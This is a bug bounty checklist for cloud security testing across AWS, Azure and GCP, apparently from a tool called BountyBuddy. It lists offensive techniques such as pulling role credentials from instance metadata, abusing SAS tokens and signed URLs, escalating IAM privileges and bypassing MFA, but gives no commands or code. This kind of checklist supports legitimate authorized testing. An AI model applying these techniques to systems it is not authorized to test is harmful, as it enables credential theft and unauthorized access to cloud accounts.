### 🔍 Test for cross-account access permissions

### 🔍 Investigate possible subdomain takeovers via S3

### 🔍 Enumerate Lambda functions across regions
- [ ] Inspect Lambda environment variables for secrets or credentials

### 🔍 Test abuse of Lambda execution roles
- [ ] Check Lambda event source configuration for privilege escalation
- [ ] Analyze Lambda layers for poisoning or malicious code

### 🔍 Enumerate IAM users, groups, and roles

### 🔍 Test for role assumption vulnerabilities in IAM
- [ ] Analyze IAM policies for privilege escalation paths

### 🔍 Check cross-account trust relationships in IAM

### 🔍 Look for misuse of service-linked roles IAM

### 🔍 Test exposure of Instance Metadata Service v1
- [ ] Verify proper enforcement of IMDSv2 session tokens
- [ ] Attempt safe extraction of temporary role credentials (authorized only)

### 🔍 Enumerate Security Groups via metadata if exposed

### 🔍 Azure Security Testing
- [ ] Review Azure Blob, SAS tokens, and AD settings to spot public access, weak permissions, and policy gaps.
- [ ] Check for public container access in Azure Blob Storage
- [ ] Test for Shared Access Signature (SAS) token abuse

### 🔍 Verify cross-tenant access permissions on blobs
- [ ] Test soft delete configuration and potential bypass
- [ ] Analyze and test for Azure AD token manipulation issues
- [ ] Review and abuse excessive application permissions (if allowed)

### 🔍 Check for conditional access bypass scenarios
- [ ] Assess MFA enforcement and bypass techniques (authorized only)

### 🔍 Google Cloud Platform Testing
- [ ] Check GCP storage, metadata, firewall, and service accounts for unsafe access or configuration flaws.
- [ ] Enumerate GCP Cloud Storage buckets for public or weak permissions
- [ ] Test for ACL manipulation on Cloud Storage buckets

### 🔍 Check for uniform bucket-level access bypass

### 🔍 Abuse signed URLs to gain unauthorized access

### 🔍 Assess metadata service for exposure or abuse
- [ ] Test for service account privilege escalation paths
- [ ] Evaluate security of instance group configurations
- [ ] Test for firewall rule misconfigurations or bypass

### 🔍 BountyBuddy
- [ ] The most comprehensive bug bounty hunting checklist with authentic terminal commands.

### 🔍 Built with ❤️ for the security community

### 🔍 Happy hunting!